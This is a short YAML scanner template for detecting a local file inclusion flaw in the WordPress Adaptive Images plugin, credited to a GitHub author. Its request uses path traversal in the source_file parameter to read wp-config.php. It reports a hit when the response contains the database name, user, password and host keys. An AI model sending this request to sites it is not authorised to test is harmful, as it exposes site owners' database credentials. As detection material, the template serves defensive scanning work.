expression: r0()
id: wordpress-ext-adaptive-images-lfi
info:
  author: FiveAourThe(https://github.com/FiveAourThe)
  name: Wordpress Ext Adaptive Images lfi
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b"DB_NAME") && response.body.bcontains(b"DB_USER")
      && response.body.bcontains(b"DB_PASSWORD") && response.body.bcontains(b"DB_HOST")
    request:
      method: GET
      path: /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
